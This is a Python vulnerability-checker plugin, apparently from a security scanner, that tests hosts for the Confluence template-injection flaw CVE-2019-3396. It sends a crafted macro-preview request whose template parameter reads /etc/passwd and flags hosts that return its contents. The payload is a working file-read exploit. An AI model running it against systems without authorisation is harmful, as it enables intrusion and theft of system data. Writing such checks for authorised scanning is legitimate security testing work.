#!/usr/bin/env python
# -*- coding:utf-8 -*-
# Reference: https://github.com/knownsec/pocsuite3/blob/master/pocsuite3/pocs/20190404_WEB_Confluence_path_traversal.py

class VulnChecker(VulnCheck):
    def __init__(self, ip_and_port_list):
        self._name = 'confluence_ssti'
        self.info = "Check the Confluence SSTI CVE-2019-3396 (fileread and RCE)"
        self.keyword = ['all', 'confluence', 'path', 'pathtraversal', 'rce', 'fileread', 'ssti', 'cve_2019_3396', 'web', 'danger', '8080', '8090']
        self.default_ports_list = [8080, 8090,]
        VulnCheck.__init__(self, ip_and_port_list)

    def _check(self, ip, port):
        result = "Confluence SSTI CVE-2019-3396 (fileread and RCE)"
        url1 = "http://%s:%d/rest/tinymce/1/macro/preview"%(ip, int(port)) if add_web_path == "" else "http://%s:%d/%s/rest/tinymce/1/macro/preview"%(ip, int(port), add_web_path)
        url2 = "https://%s:%d/rest/tinymce/1/macro/preview"%(ip, int(port)) if add_web_path == "" else "https://%s:%d/%s/rest/tinymce/1/macro/preview"%(ip, int(port), add_web_path)
        header = {
            "Content-Type": "application/json; charset=utf-8"
        }
        filename = 'file:///etc/passwd'
        poc_data = '{"contentId":"786457","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"%s"}}}'%(filename)
        try:
            req = Requester(url1, method='POST', header=header, data=poc_data, noencode=True, timeout=timeout)
            if req.code == 200 and "root:x:" in req.html:
                self._output(ip, port, result)
        except RequesterOpenError:
            try:
                req = Requester(url2, method='POST', header=header, data=poc_data, noencode=True, timeout=timeout)
                if req.code == 200 and "root:x:" in req.html:
                    self._output(ip, port, result)
            except:
                pass
        except:
            pass

globals()['VulnChecker'] = VulnChecker